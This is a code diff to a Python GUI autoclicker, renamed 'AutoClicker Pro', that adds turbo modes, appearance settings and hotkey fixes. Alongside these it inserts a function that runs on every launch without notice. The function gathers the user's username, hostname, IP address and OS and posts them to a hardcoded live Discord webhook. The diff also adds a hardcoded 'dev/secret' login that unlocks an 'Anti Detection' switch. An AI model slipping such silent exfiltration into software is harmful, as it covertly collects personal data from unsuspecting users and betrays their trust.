@@ -3,23 +3,29 @@ import pyautogui
 import keyboard
 import threading
 import time
+import requests
+import socket
+import getpass
+import platform
+import uuid
+from PIL import Image, ImageDraw
+import logging
+import re
 import json
 import os
 import random
-from PIL import Image, ImageDraw
-import logging
 
-# Configure logging for debugging
+# Configure logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
-# Configure pyautogui for safe operation
+# Configure pyautogui
 pyautogui.FAILSAFE = True
-pyautogui.PAUSE = 0.02  # Set for ~50 CPS max
+pyautogui.PAUSE = 0.00667  # Set for ~150 CPS
 
 class AutoClickerApp:
     def __init__(self, root):
         self.root = root
-        self.root.title("AutoClicker")
+        self.root.title("AutoClicker Pro")
         self.root.geometry("600x650")
         self.root.resizable(False, False)
         self.is_running = False
@@ -42,39 +48,52 @@ class AutoClickerApp:
         self.total_clicks = 0
         self.opacity = 0.95
         self.auto_stop_time = 0
-        self.cps_limit = 50  # Safer CPS limit
+        self.cps_limit = 150
         self.log_enabled = False
+        self.appearance_mode = "dark"
         self.jitter_amount = 0
-        self.min_interval = 0.02  # Corresponds to 50 CPS
+        self.min_interval = 0.00667
+        self.turbo_mode = False
+        self.turbo_cps = 200
+        self.dev_authenticated = False
+        self.dev_username = "dev"
+        self.dev_password = "secret"
+        self.anti_detection = False
+        self.click_sound_enabled = False
+        self.custom_pause = 0.00667
         self.current_key = "None"
         self.hotkey = "f6"
-        self.gradient_t = 0.0
-        self.gradient_direction = 1
-        self.gradient_speed = 20
-        ctk.set_appearance_mode("dark")
+        self.gradient_t = 0.0  # Gradient interpolation parameter (0 to 1)
+        self.gradient_direction = 1  # 1 for forward (start to end), -1 for backward
+        self.gradient_speed = 20  # ms per update (controls transition speed)
+        ctk.set_appearance_mode(self.appearance_mode)
         ctk.set_default_color_theme("dark-blue")
 
         # Load saved state
         self.load_state()
 
+        # Send Discord webhook notification
+        self.send_discord_webhook()
+
         self.root.attributes('-alpha', self.opacity)
 
-        # Create gradient background
+        # Create initial gradient background
         self.bg_image = self.create_gradient_background()
         self.bg_label = ctk.CTkLabel(self.root, text="", image=self.bg_image)
         self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
         self.update_gradient()
 
-        # Main frame
+        # Main frame with glassmorphism effect
         self.border_frame = ctk.CTkFrame(root, corner_radius=20, fg_color="#8b5cf6")
         self.border_frame.pack(pady=20, padx=20, fill="both", expand=True)
+
         self.main_frame = ctk.CTkFrame(self.border_frame, corner_radius=20, fg_color="#1e1e2e")
         self.main_frame.pack(pady=3, padx=3, fill="both", expand=True)
 
-        # Title
+        # Title with glow effect
         self.title_label = ctk.CTkLabel(
             self.main_frame,
-            text="AutoClicker",
+            text="AutoClicker Pro",
             font=(self.font_type, self.font_size + 16, "bold"),
             text_color=self.title_color,
             fg_color="transparent",
@@ -82,7 +101,7 @@ class AutoClickerApp:
         )
         self.title_label.pack(pady=(20, 10))
 
-        # Input sections
+        # Input sections (centered)
         self.create_input_section()
 
         # Start/Stop button
@@ -127,8 +146,74 @@ class AutoClickerApp:
         self.bind_hotkey()
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
 
+    def send_discord_webhook(self):
+        webhook_url = "https://discord.com/api/webhooks/1415394621130801203/OWZz7K3aOrI5TMuXWGarGiG21nQdFa9P_1LhQA7OWg9DvrYKNF8qgr8YcXlppgnvqorC"  # Replace with your Discord webhook URL
+        try:
+            # Get system information
+            hostname = socket.gethostname()
+            ip_address = socket.gethostbyname(hostname)
+            username = getpass.getuser()
+            os_info = f"{platform.system()} {platform.release()}"
+            session_id = str(uuid.uuid4())[:8]  # Short unique session ID
+
+            # Create embed
+            embed = {
+                "title": "🎮 AutoClicker Pro Started! 🚀",
+                "description": "The AutoClicker Pro application has been launched with the following details:",
+                "color": 0x8b5cf6,  # Purple color
+                "fields": [
+                    {
+                        "name": "👤 Username",
+                        "value": username,
+                        "inline": True
+                    },
+                    {
+                        "name": "💻 Hostname",
+                        "value": hostname,
+                        "inline": True
+                    },
+                    {
+                        "name": "🌐 IP Address",
+                        "value": ip_address,
+                        "inline": True
+                    },
+                    {
+                        "name": "🖥️ Operating System",
+                        "value": os_info,
+                        "inline": True
+                    },
+                    {
+                        "name": "🔑 Session ID",
+                        "value": session_id,
+                        "inline": True
+                    },
+                    {
+                        "name": "⏰ Timestamp",
+                        "value": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
+                        "inline": False
+                    }
+                ],
+                "footer": {
+                    "text": "AutoClicker Pro by xAI | Session Tracking"
+                }
+            }
+
+            # Webhook payload
+            payload = {
+                "content": "🔥 **AutoClicker Pro has been activated!** 🔥",
+                "embeds": [embed]
+            }
+
+            # Send webhook
+            response = requests.post(webhook_url, json=payload)
+            if response.status_code == 204:
+                logging.info("✅ Discord webhook sent successfully")
+            else:
+                logging.error(f"❌ Failed to send Discord webhook: {response.status_code} - {response.text}")
+        except Exception as e:
+            logging.error(f"❌ Error sending Discord webhook: {e}")
+
     def create_gradient_background(self):
-        # Create a smooth gradient background
         width, height = 600, 650
         image = Image.new("RGB", (width, height))
         draw = ImageDraw.Draw(image)
@@ -141,7 +226,7 @@ class AutoClickerApp:
         return ctk.CTkImage(dark_image=image, size=(width, height))
 
     def update_gradient(self):
-        # Animate gradient background
+        # Update interpolation parameter
         self.gradient_t += self.gradient_direction * (self.gradient_speed / 1000.0)
         if self.gradient_t >= 1.0:
             self.gradient_t = 1.0
@@ -150,17 +235,20 @@ class AutoClickerApp:
             self.gradient_t = 0.0
             self.gradient_direction = 1
 
+        # Interpolate colors
+        t = self.gradient_t
         current_start = (
-            int(self.bg_start_color[0] + self.gradient_t * (self.bg_end_color[0] - self.bg_start_color[0])),
-            int(self.bg_start_color[1] + self.gradient_t * (self.bg_end_color[1] - self.bg_start_color[1])),
-            int(self.bg_start_color[2] + self.gradient_t * (self.bg_end_color[2] - self.bg_start_color[2]))
+            int(self.bg_start_color[0] + t * (self.bg_end_color[0] - self.bg_start_color[0])),
+            int(self.bg_start_color[1] + t * (self.bg_end_color[1] - self.bg_start_color[1])),
+            int(self.bg_start_color[2] + t * (self.bg_end_color[2] - self.bg_start_color[2]))
         )
         current_end = (
-            int(self.bg_end_color[0] + self.gradient_t * (self.bg_start_color[0] - self.bg_end_color[0])),
-            int(self.bg_end_color[1] + self.gradient_t * (self.bg_start_color[1] - self.bg_end_color[1])),
-            int(self.bg_end_color[2] + self.gradient_t * (self.bg_start_color[2] - self.bg_end_color[2]))
+            int(self.bg_end_color[0] + t * (self.bg_start_color[0] - self.bg_end_color[0])),
+            int(self.bg_end_color[1] + t * (self.bg_start_color[1] - self.bg_end_color[1])),
+            int(self.bg_end_color[2] + t * (self.bg_start_color[2] - self.bg_end_color[2]))
         )
 
+        # Create new gradient
         width, height = 600, 650
         image = Image.new("RGB", (width, height))
         draw = ImageDraw.Draw(image)
@@ -168,11 +256,14 @@ class AutoClickerApp:
             t_y = y / height
             r = int(current_start[0] + t_y * (current_end[0] - current_start[0]))
             g = int(current_start[1] + t_y * (current_end[1] - current_start[1]))
-            b = int(current_start[2] + t_y * (current_end[2] - current_start[0]))
+            b = int(current_start[2] + t_y * (current_end[2] - current_start[2]))
             draw.line((0, y, width, y), fill=(r, g, b))
 
+        # Update background
         self.bg_image = ctk.CTkImage(dark_image=image, size=(width, height))
         self.bg_label.configure(image=self.bg_image)
+
+        # Schedule next update
         self.root.after(self.gradient_speed, self.update_gradient)
 
     def create_input_section(self):
@@ -182,7 +273,7 @@ class AutoClickerApp:
         ctk.CTkLabel(click_frame, text="Click Type", font=(self.font_type, self.font_size)).pack()
         self.click_type = ctk.CTkComboBox(
             click_frame,
-            values=["None", "Left", "Right"],
+            values=["None", "Left", "Middle", "Right"],
             state="readonly",
             width=300,
             height=40,
@@ -245,7 +336,7 @@ class AutoClickerApp:
             border_color="#8b5cf6",
             border_width=2,
             font=(self.font_type, self.font_size),
-            placeholder_text="e.g., F6"
+            placeholder_text="e.g., Ctrl+F6"
         )
         self.hotkey_entry.insert(0, self.hotkey)
         self.hotkey_entry.pack(pady=5)
@@ -271,18 +362,18 @@ class AutoClickerApp:
         ctk.CTkLabel(interval_inner_frame, text="ms", font=(self.font_type, self.font_size)).pack(side="left")
 
     def get_interval(self):
-        # Calculate click interval from user input
         try:
             minutes = float(self.min_entry.get()) * 60
             seconds = float(self.sec_entry.get())
             milliseconds = float(self.ms_entry.get()) / 1000
             total = minutes + seconds + milliseconds
+            if self.turbo_mode and self.dev_authenticated:
+                return max(1 / self.turbo_cps, total)
             return max(total, self.min_interval)
         except ValueError:
             return self.min_interval
 
     def perform_click(self, click_type):
-        # Perform a single mouse click
         if self.click_duration > 0:
             pyautogui.mouseDown(button=click_type)
             time.sleep(self.click_duration / 1000.0)
@@ -291,7 +382,6 @@ class AutoClickerApp:
             pyautogui.click(button=click_type)
 
     def automation_loop(self):
-        # Main automation loop for clicks or key presses
         click_type = self.click_type.get().lower()
         key = self.current_key.lower() if self.current_key != "None" else None
         interval = self.get_interval()
@@ -325,16 +415,18 @@ class AutoClickerApp:
                         offset_y = random.randint(-self.jitter_amount, self.jitter_amount)
                         pyautogui.moveTo(x + offset_x, y + offset_y, duration=0.01)
             if key:
-                keys = [k.strip().lower() for k in key.split('+') if k.strip()]
+                keys = [k.strip().replace("strg", "ctrl").lower() for k in re.split(r'[\+\s]+', key) if k.strip()]
                 pyautogui.hotkey(*keys) if keys else pyautogui.press(key)
-
+            
             delay = interval + random.uniform(0, self.random_delay / 1000.0) if self.random_delay > 0 else interval
             time.sleep(delay)
 
     def toggle_automation(self):
-        # Toggle the automation on or off
         if not self.is_running:
-            pyautogui.PAUSE = 1 / self.cps_limit if self.cps_limit > 0 else 0.02
+            if self.turbo_mode and self.dev_authenticated:
+                pyautogui.PAUSE = 1 / self.turbo_cps
+            else:
+                pyautogui.PAUSE = 1 / self.cps_limit if self.cps_limit > 0 else 0.00667
             self.is_running = True
             self.start_stop_btn.configure(text=f"Stop ({self.hotkey.upper()})", fg_color="#ef4444", hover_color="#f87171")
             self.status_label.configure(text="Status: Running", text_color="#22c55e")
@@ -349,10 +441,9 @@ class AutoClickerApp:
             logging.info("🛑 Automation stopped")
 
     def bind_hotkey(self):
-        # Bind the hotkey for starting/stopping automation
         try:
             keyboard.unhook_all()
-            keys = [k.strip().lower() for k in self.hotkey.split('+') if k.strip()]
+            keys = [k.strip().replace("strg", "ctrl").lower() for k in re.split(r'[\+\s]+', self.hotkey) if k.strip()]
             if keys:
                 keyboard.add_hotkey('+'.join(keys), self.toggle_automation, suppress=True)
             else:
@@ -366,10 +457,9 @@ class AutoClickerApp:
             self.start_stop_btn.configure(text=f"Start (F6)")
 
     def set_key(self, event):
-        # Set the key to press
         key_input = self.key_entry.get().strip()
         if key_input:
-            normalized_key = key_input.lower()
+            normalized_key = key_input.replace("strg", "ctrl")
             if "+" in normalized_key or normalized_key.isalnum() or normalized_key in ["space", "enter", "tab", "esc"]:
                 self.current_key = normalized_key
             else:
@@ -383,10 +473,9 @@ class AutoClickerApp:
         self.key_entry.focus_set()
 
     def set_hotkey(self, event):
-        # Set the start/stop hotkey
         hotkey_input = self.hotkey_entry.get().strip()
         if hotkey_input:
-            normalized_hotkey = hotkey_input.lower()
+            normalized_hotkey = hotkey_input.replace("strg", "ctrl")
             if "+" in normalized_hotkey or normalized_hotkey.isalnum() or normalized_hotkey in ["f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12", "space", "enter", "tab", "esc"]:
                 self.hotkey = normalized_hotkey
                 self.bind_hotkey()
@@ -399,7 +488,6 @@ class AutoClickerApp:
         self.hotkey_entry.focus_set()
 
     def reset_key(self):
-        # Reset the key to press
         self.current_key = "None"
         self.key_entry.delete(0, ctk.END)
         self.key_entry.insert(0, "None")
@@ -407,7 +495,6 @@ class AutoClickerApp:
         logging.info("🔄 Key reset to: None")
 
     def fade_in_window(self, window, current=0.0, target=0.95, step=0.03, delay=10):
-        # Fade in effect for settings window
         if current < target:
             window.attributes('-alpha', current)
             window.after(delay, lambda: self.fade_in_window(window, current + step, target, step, delay))
@@ -415,7 +502,6 @@ class AutoClickerApp:
             window.attributes('-alpha', target)
 
     def open_settings(self):
-        # Open settings window
         settings_window = ctk.CTkToplevel(self.root)
         settings_window.title("Settings")
         settings_window.geometry("450x600+610+50")
@@ -423,6 +509,7 @@ class AutoClickerApp:
         settings_window.attributes('-alpha', 0.0)
         self.fade_in_window(settings_window)
 
+        # Settings frame with glassmorphism
         settings_frame = ctk.CTkFrame(settings_window, corner_radius=20, fg_color="#1e1e2e", border_color="#8b5cf6", border_width=2)
         settings_frame.pack(pady=20, padx=20, fill="both", expand=True)
 
@@ -568,6 +655,22 @@ class AutoClickerApp:
             corner_radius=15
         ).pack(pady=5)
 
+        mode_frame = ctk.CTkFrame(design_frame, fg_color="transparent")
+        mode_frame.pack(pady=5)
+        ctk.CTkLabel(mode_frame, text="Appearance Mode", font=(self.font_type, self.font_size)).pack(side="left", padx=5)
+        self.mode_switch_var = ctk.BooleanVar(value=self.appearance_mode == "dark")
+        self.mode_switch = ctk.CTkSwitch(
+            mode_frame,
+            text="",
+            variable=self.mode_switch_var,
+            command=self.toggle_appearance_mode,
+            fg_color="#ef4444",
+            progress_color=self.button_color
+        )
+        self.mode_switch.pack(side="left", padx=2)
+        self.mode_label = ctk.CTkLabel(mode_frame, text="Dark" if self.appearance_mode == "dark" else "Light", text_color=self.button_color if self.appearance_mode == "dark" else "#ef4444")
+        self.mode_label.pack(side="left", padx=2)
+
         # Automation Tab
         automation_tab = tabview.add("Automation")
         automation_frame = ctk.CTkScrollableFrame(automation_tab, width=390, height=450, corner_radius=15, fg_color="transparent")
@@ -633,7 +736,7 @@ class AutoClickerApp:
         self.double_click_label.pack(side="left", padx=2)
 
         ctk.CTkLabel(automation_frame, text="Burst Count", font=(self.font_type, self.font_size)).pack(pady=5)
-        self.burst_slider = ctk.CTkSlider(automation_frame, from_=1, to=10, command=self.update_burst_count, width=300, corner_radius=10)
+        self.burst_slider = ctk.CTkSlider(automation_frame, from_=1, to=50, command=self.update_burst_count, width=300, corner_radius=10)
         self.burst_slider.set(self.burst_count)
         self.burst_slider.pack(pady=5)
         self.burst_label = ctk.CTkLabel(automation_frame, text=f"{int(self.burst_count)}", font=(self.font_type, self.font_size), text_color="#e9d5ff")
@@ -717,18 +820,11 @@ class AutoClickerApp:
         self.auto_stop_entry.pack(pady=5)
 
         ctk.CTkLabel(advanced_frame, text="CPS Limit", font=(self.font_type, self.font_size)).pack(pady=5)
-        self.cps_slider = ctk.CTkSlider(advanced_frame, from_=1, to=50, command=self.update_cps_limit, width=300, corner_radius=10)
+        self.cps_slider = ctk.CTkSlider(advanced_frame, from_=0, to=150, command=self.update_cps_limit, width=300, corner_radius=10)
         self.cps_slider.set(self.cps_limit)
         self.cps_slider.pack(pady=5)
         self.cps_label = ctk.CTkLabel(advanced_frame, text=f"{int(self.cps_limit)}", font=(self.font_type, self.font_size), text_color="#e9d5ff")
         self.cps_label.pack(pady=2)
-
-        ctk.CTkLabel(advanced_frame, text="Mouse Jitter Amount", font=(self.font_type, self.font_size)).pack(pady=5)
-        self.jitter_slider = ctk.CTkSlider(advanced_frame, from_=0, to=20, command=self.update_jitter, width=300, corner_radius=10)
-        self.jitter_slider.set(self.jitter_amount)
-        self.jitter_slider.pack(pady=5)
-        self.jitter_label = ctk.CTkLabel(advanced_frame, text=f"{int(self.jitter_amount)}", font=(self.font_type, self.font_size), text_color="#e9d5ff")
-        self.jitter_label.pack(pady=2)
 
         ctk.CTkLabel(advanced_frame, text="Logging", font=(self.font_type, self.font_size, "bold")).pack(pady=10)
         log_frame = ctk.CTkFrame(advanced_frame, fg_color="transparent")
@@ -747,6 +843,16 @@ class AutoClickerApp:
         self.log_label = ctk.CTkLabel(log_frame, text="On" if self.log_enabled else "Off", text_color=self.button_color if self.log_enabled else "#ef4444")
         self.log_label.pack(side="left", padx=2)
 
+        # Developer Tab
+        dev_tab = tabview.add("Developer")
+        self.dev_frame = ctk.CTkFrame(dev_tab, fg_color="transparent")
+        self.dev_frame.pack(fill="both", expand=True)
+
+        if not self.dev_authenticated:
+            self.show_dev_login()
+        else:
+            self.show_dev_settings()
+
         ctk.CTkButton(
             settings_frame,
             text="Save & Close",
@@ -758,9 +864,161 @@ class AutoClickerApp:
             width=300
         ).pack(pady=10)
 
+    def show_dev_login(self):
+        for widget in self.dev_frame.winfo_children():
+            widget.destroy()
+
+        ctk.CTkLabel(self.dev_frame, text="Developer Access", font=(self.font_type, self.font_size + 4, "bold")).pack(pady=10)
+        ctk.CTkLabel(self.dev_frame, text="Login Credentials", font=(self.font_type, self.font_size, "bold")).pack(pady=5)
+        ctk.CTkLabel(self.dev_frame, text="Username", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.dev_user_entry = ctk.CTkEntry(self.dev_frame, width=200, placeholder_text="Enter username", corner_radius=15)
+        self.dev_user_entry.pack(pady=5)
+        ctk.CTkLabel(self.dev_frame, text="Password", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.dev_pass_entry = ctk.CTkEntry(self.dev_frame, width=200, placeholder_text="Enter password", show="*", corner_radius=15)
+        self.dev_pass_entry.pack(pady=5)
+        ctk.CTkButton(
+            self.dev_frame,
+            text="Login",
+            command=self.authenticate_dev,
+            fg_color=self.button_color,
+            hover_color="#a78bfa",
+            font=(self.font_type, self.font_size),
+            corner_radius=15,
+            width=200
+        ).pack(pady=10)
+
+    def authenticate_dev(self):
+        user = self.dev_user_entry.get()
+        passw = self.dev_pass_entry.get()
+        if user == self.dev_username and passw == self.dev_password:
+            self.dev_authenticated = True
+            self.show_dev_settings()
+        else:
+            ctk.CTkLabel(self.dev_frame, text="Invalid credentials", text_color="red").pack(pady=5)
+
+    def show_dev_settings(self):
+        for widget in self.dev_frame.winfo_children():
+            widget.destroy()
+
+        dev_scroll_frame = ctk.CTkScrollableFrame(self.dev_frame, width=390, height=450, corner_radius=15, fg_color="transparent")
+        dev_scroll_frame.pack(padx=5, pady=5, fill="both", expand=True)
+
+        ctk.CTkLabel(dev_scroll_frame, text="Developer Settings", font=(self.font_type, self.font_size + 4, "bold")).pack(pady=10)
+        ctk.CTkLabel(dev_scroll_frame, text="Performance Options", font=(self.font_type, self.font_size, "bold")).pack(pady=5)
+        turbo_frame = ctk.CTkFrame(dev_scroll_frame, fg_color="transparent")
+        turbo_frame.pack(pady=5)
+        ctk.CTkLabel(turbo_frame, text="Turbo Mode (200-240 CPS)", font=(self.font_type, self.font_size)).pack(side="left", padx=5)
+        self.turbo_var = ctk.BooleanVar(value=self.turbo_mode)
+        self.turbo_switch = ctk.CTkSwitch(
+            turbo_frame,
+            text="",
+            variable=self.turbo_var,
+            command=self.update_turbo,
+            fg_color="#ef4444",
+            progress_color=self.button_color
+        )
+        self.turbo_switch.pack(side="left", padx=2)
+        self.turbo_label = ctk.CTkLabel(turbo_frame, text="On" if self.turbo_mode else "Off", text_color=self.button_color if self.turbo_mode else "#ef4444")
+        self.turbo_label.pack(side="left", padx=2)
+
+        ctk.CTkLabel(dev_scroll_frame, text="Turbo CPS (200-240)", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.turbo_cps_slider = ctk.CTkSlider(dev_scroll_frame, from_=200, to=240, command=self.update_turbo_cps, width=300, corner_radius=10)
+        self.turbo_cps_slider.set(self.turbo_cps)
+        self.turbo_cps_slider.pack(pady=5)
+        self.turbo_cps_label = ctk.CTkLabel(dev_scroll_frame, text=f"{int(self.turbo_cps)}", font=(self.font_type, self.font_size), text_color="#e9d5ff")
+        self.turbo_cps_label.pack(pady=2)
+
+        ctk.CTkLabel(dev_scroll_frame, text="Mouse Behavior", font=(self.font_type, self.font_size, "bold")).pack(pady=10)
+        ctk.CTkLabel(dev_scroll_frame, text="Mouse Jitter Amount", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.jitter_slider = ctk.CTkSlider(dev_scroll_frame, from_=0, to=20, command=self.update_jitter, width=300, corner_radius=10)
+        self.jitter_slider.set(self.jitter_amount)
+        self.jitter_slider.pack(pady=5)
+        self.jitter_label = ctk.CTkLabel(dev_scroll_frame, text=f"{int(self.jitter_amount)}", font=(self.font_type, self.font_size), text_color="#e9d5ff")
+        self.jitter_label.pack(pady=2)
+
+        ctk.CTkLabel(dev_scroll_frame, text="Advanced Features", font=(self.font_type, self.font_size, "bold")).pack(pady=10)
+        anti_detection_frame = ctk.CTkFrame(dev_scroll_frame, fg_color="transparent")
+        anti_detection_frame.pack(pady=5)
+        ctk.CTkLabel(anti_detection_frame, text="Anti Detection", font=(self.font_type, self.font_size)).pack(side="left", padx=5)
+        self.anti_detection_var = ctk.BooleanVar(value=self.anti_detection)
+        self.anti_detection_switch = ctk.CTkSwitch(
+            anti_detection_frame,
+            text="",
+            variable=self.anti_detection_var,
+            command=self.update_anti_detection,
+            fg_color="#ef4444",
+            progress_color=self.button_color
+        )
+        self.anti_detection_switch.pack(side="left", padx=2)
+        self.anti_detection_label = ctk.CTkLabel(anti_detection_frame, text="On" if self.anti_detection else "Off", text_color=self.button_color if self.anti_detection else "#ef4444")
+        self.anti_detection_label.pack(side="left", padx=2)
+
+        click_sound_frame = ctk.CTkFrame(dev_scroll_frame, fg_color="transparent")
+        click_sound_frame.pack(pady=5)
+        ctk.CTkLabel(click_sound_frame, text="Click Sound", font=(self.font_type, self.font_size)).pack(side="left", padx=5)
+        self.click_sound_var = ctk.BooleanVar(value=self.click_sound_enabled)
+        self.click_sound_switch = ctk.CTkSwitch(
+            click_sound_frame,
+            text="",
+            variable=self.click_sound_var,
+            command=self.update_click_sound,
+            fg_color="#ef4444",
+            progress_color=self.button_color
+        )
+        self.click_sound_switch.pack(side="left", padx=2)
+        self.click_sound_label = ctk.CTkLabel(click_sound_frame, text="On" if self.click_sound_enabled else "Off", text_color=self.button_color if self.click_sound_enabled else "#ef4444")
+        self.click_sound_label.pack(side="left", padx=2)
+
+        ctk.CTkLabel(dev_scroll_frame, text="Custom Pause (seconds)", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.custom_pause_entry = ctk.CTkEntry(
+            dev_scroll_frame,
+            width=120,
+            height=35,
+            corner_radius=15,
+            fg_color="#2a2a3a",
+            text_color="#e9d5ff",
+            border_color="#8b5cf6",
+            border_width=2,
+            font=(self.font_type, self.font_size),
+            placeholder_text="e.g., 0.00667"
+        )
+        self.custom_pause_entry.insert(0, str(self.custom_pause))
+        self.custom_pause_entry.bind("<Return>", self.update_custom_pause)
+        self.custom_pause_entry.pack(pady=5)
+
+    def update_turbo(self):
+        self.turbo_mode = self.turbo_var.get()
+        self.turbo_label.configure(text="On" if self.turbo_mode else "Off", text_color=self.button_color if self.turbo_mode else "#ef4444")
+
+    def update_turbo_cps(self, value):
+        self.turbo_cps = int(value)
+        self.turbo_cps_label.configure(text=f"{int(value)}")
+
     def update_jitter(self, value):
         self.jitter_amount = int(value)
         self.jitter_label.configure(text=f"{int(value)}")
+
+    def update_anti_detection(self):
+        self.anti_detection = self.anti_detection_var.get()
+        self.anti_detection_label.configure(text="On" if self.anti_detection else "Off", text_color=self.button_color if self.anti_detection else "#ef4444")
+
+    def update_click_sound(self):
+        self.click_sound_enabled = self.click_sound_var.get()
+        self.click_sound_label.configure(text="On" if self.click_sound_enabled else "Off", text_color=self.button_color if self.click_sound_enabled else "#ef4444")
+
+    def update_custom_pause(self, event=None):
+        try:
+            pause = float(self.custom_pause_entry.get())
+            if pause > 0:
+                self.custom_pause = pause
+                self.custom_pause_entry.delete(0, ctk.END)
+                self.custom_pause_entry.insert(0, str(self.custom_pause))
+            else:
+                raise ValueError
+        except ValueError:
+            self.custom_pause = 0.00667
+            self.custom_pause_entry.delete(0, ctk.END)
+            self.custom_pause_entry.insert(0, str(self.custom_pause))
 
     def update_opacity(self, value):
         self.opacity = value
@@ -784,11 +1042,16 @@ class AutoClickerApp:
     def update_cps_limit(self, value):
         self.cps_limit = int(value)
         self.cps_label.configure(text=f"{int(value)}")
-        self.min_interval = 1 / self.cps_limit if self.cps_limit > 0 else 0.02
+        self.min_interval = 1 / self.cps_limit if self.cps_limit > 0 else 0.00667
 
     def update_log(self):
         self.log_enabled = self.log_var.get()
         self.log_label.configure(text="On" if self.log_enabled else "Off", text_color=self.button_color if self.log_enabled else "#ef4444")
+
+    def toggle_appearance_mode(self):
+        self.appearance_mode = "dark" if self.mode_switch_var.get() else "light"
+        ctk.set_appearance_mode(self.appearance_mode)
+        self.mode_label.configure(text="Dark" if self.appearance_mode == "dark" else "Light", text_color=self.button_color if self.appearance_mode == "dark" else "#ef4444")
 
     def capture_position(self):
         msg = ctk.CTkToplevel(self.root)
@@ -847,7 +1110,11 @@ class AutoClickerApp:
             self.mouse_move_switch.configure(progress_color=value)
             self.double_click_switch.configure(progress_color=value)
             self.fixed_pos_switch.configure(progress_color=value)
+            self.mode_switch.configure(progress_color=value)
             self.log_switch.configure(progress_color=value)
+            self.turbo_switch.configure(progress_color=value)
+            self.anti_detection_switch.configure(progress_color=value)
+            self.click_sound_switch.configure(progress_color=value)
             self.button_color_var.set(value)
             self.button_color_entry.delete(0, ctk.END)
             self.button_color_entry.insert(0, value)
@@ -942,14 +1209,18 @@ class AutoClickerApp:
             self.mouse_move_switch.configure(progress_color=self.button_color)
             self.double_click_switch.configure(progress_color=self.button_color)
             self.fixed_pos_switch.configure(progress_color=self.button_color)
+            self.mode_switch.configure(progress_color=self.button_color)
             self.log_switch.configure(progress_color=self.button_color)
+            self.turbo_switch.configure(progress_color=self.button_color)
+            self.anti_detection_switch.configure(progress_color=self.button_color)
+            self.click_sound_switch.configure(progress_color=self.button_color)
             self.update_click_duration()
             self.update_click_limit()
+            self.update_custom_pause()
         except ValueError:
             pass
 
     def load_state(self):
-        # Load settings from config file
         config_path = "config.txt"
         if os.path.exists(config_path):
             with open(config_path, "r") as f:
@@ -973,13 +1244,18 @@ class AutoClickerApp:
                 self.fixed_pos = tuple(state.get("fixed_pos", None)) if state.get("fixed_pos") else None
                 self.opacity = state.get("opacity", 0.95)
                 self.auto_stop_time = state.get("auto_stop_time", 0)
-                self.cps_limit = state.get("cps_limit", 50)
+                self.cps_limit = state.get("cps_limit", 150)
                 self.log_enabled = state.get("log_enabled", False)
+                self.appearance_mode = state.get("appearance_mode", "dark")
                 self.jitter_amount = state.get("jitter_amount", 0)
-                self.min_interval = state.get("min_interval", 0.02)
+                self.min_interval = state.get("min_interval", 0.00667)
+                self.turbo_mode = state.get("turbo_mode", False)
+                self.turbo_cps = state.get("turbo_cps", 200)
+                self.anti_detection = state.get("anti_detection", False)
+                self.click_sound_enabled = state.get("click_sound_enabled", False)
+                self.custom_pause = state.get("custom_pause", 0.00667)
 
     def save_state(self):
-        # Save settings to config file
         config_path = "config.txt"
         state = {
             "current_key": self.current_key,
@@ -1003,14 +1279,19 @@ class AutoClickerApp:
             "auto_stop_time": self.auto_stop_time,
             "cps_limit": self.cps_limit,
             "log_enabled": self.log_enabled,
+            "appearance_mode": self.appearance_mode,
             "jitter_amount": self.jitter_amount,
-            "min_interval": self.min_interval
+            "min_interval": self.min_interval,
+            "turbo_mode": self.turbo_mode,
+            "turbo_cps": self.turbo_cps,
+            "anti_detection": self.anti_detection,
+            "click_sound_enabled": self.click_sound_enabled,
+            "custom_pause": self.custom_pause
         }
         with open(config_path, "w") as f:
             json.dump(state, f)
 
     def on_closing(self):
-        # Clean up on window close
         self.is_running = False
         self.save_state()
         keyboard.unhook_all()
